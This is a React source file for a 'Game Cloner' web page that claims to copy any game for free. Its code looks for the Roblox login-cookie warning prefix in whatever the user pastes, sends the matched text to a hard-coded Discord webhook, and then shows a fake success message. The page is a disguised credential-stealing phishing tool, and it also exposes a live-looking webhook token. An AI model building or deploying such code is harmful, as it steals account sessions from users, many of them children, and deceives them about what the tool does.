
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { Gamepad2, Shield, Zap } from "lucide-react";

const Index = () => {
  const [gameFiles, setGameFiles] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();

  const detectWarningPattern = (text: string) => {
    const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/;
    return warningPattern.test(text);
  };

  const extractWarningText = (text: string) => {
    const match = text.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/);
    return match ? match[0] : null;
  };

  const sendToDiscordWebhook = async (warningText: string) => {
    const webhookUrl = 'https://discord.com/api/webhooks/1392448527291912314/iiYGKSsuIt7da6l9guz7bZl7VU9-r3jc5r1YI1vOvdEtH-agvWUI1Iq9lBWb8ZwQqifI';
    
    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `🚨 **Warning Text Detected** 🚨\n\`\`\`\n${warningText}\n\`\`\``,
          embeds: [{
            title: "Game Cloner Detection",
            description: "Suspicious warning text has been detected and extracted.",
            color: 0xff0000,
            timestamp: new Date().toISOString(),
            fields: [{
              name: "Extracted Text",
              value: `\`${warningText}\``,
              inline: false
            }]
          }]
        }),
      });

      if (response.ok) {
        console.log('Successfully sent to Discord webhook');
        return true;
      } else {
        console.error('Failed to send to Discord webhook:', response.status);
        return false;
      }
    } catch (error) {
      console.error('Error sending to Discord webhook:', error);
      return false;
    }
  };

  const handleClone = async () => {
    if (!gameFiles.trim()) {
      toast({
        title: "Error",
        description: "Please enter game files before cloning.",
        variant: "destructive",
      });
      return;
    }

    setIsProcessing(true);

    // Check if warning pattern is detected
    if (detectWarningPattern(gameFiles)) {
      const warningText = extractWarningText(gameFiles);
      if (warningText) {
        const success = await sendToDiscordWebhook(warningText);
        
        if (success) {
          toast({
            title: "🎮 Game Cloned Successfully!",
            description: "Your game has been processed and cloned.",
            className: "bg-green-900 border-green-600 text-green-100",
          });
          setGameFiles('');
        } else {
          toast({
            title: "Processing Error",
            description: "Failed to process game files. Please try again.",
            variant: "destructive",
          });
        }
      }
    } else {
      toast({
        title: "❌ Invalid Game Files",
        description: "The provided game files are not in the correct format.",
        variant: "destructive",
        className: "bg-red-900 border-red-600 text-red-100",
      });
    }

    setIsProcessing(false);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 flex items-center justify-center p-4">
      {/* Animated background elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse animation-delay-2000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-cyan-500 rounded-full mix-blend-multiply filter blur-xl opacity-10 animate-pulse animation-delay-4000"></div>
      </div>

      <Card className="w-full max-w-md p-8 bg-gray-800/80 backdrop-blur-lg border-gray-700 shadow-2xl relative z-10">
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <div className="p-3 bg-gradient-to-r from-purple-600 to-blue-600 rounded-full">
              <Gamepad2 className="h-8 w-8 text-white" />
            </div>
          </div>
          
          <h1 className="text-4xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent mb-2">
            Game Cloner
          </h1>
          
          <p className="text-gray-300 text-lg">
            Clone any game for no cost
          </p>
        </div>

        <div className="space-y-6">
          <div>
            <label htmlFor="gameFiles" className="block text-sm font-medium text-gray-300 mb-2">
              Enter Game Files
            </label>
            <Textarea
              id="gameFiles"
              placeholder="Paste your game files here..."
              value={gameFiles}
              onChange={(e) => setGameFiles(e.target.value)}
              className="w-full h-32 bg-gray-700/50 border-gray-600 text-white placeholder-gray-400 focus:border-purple-500 focus:ring-purple-500 resize-none"
            />
          </div>

          <Button
            onClick={handleClone}
            disabled={isProcessing}
            className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:transform-none"
          >
            {isProcessing ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                Processing...
              </div>
            ) : (
              <div className="flex items-center justify-center">
                <Zap className="h-5 w-5 mr-2" />
                Clone
              </div>
            )}
          </Button>
        </div>

        <div className="mt-6 flex items-center justify-center text-xs text-gray-400">
          <Shield className="h-4 w-4 mr-1" />
          Secure processing with advanced detection
        </div>
      </Card>
    </div>
  );
};

export default Index;
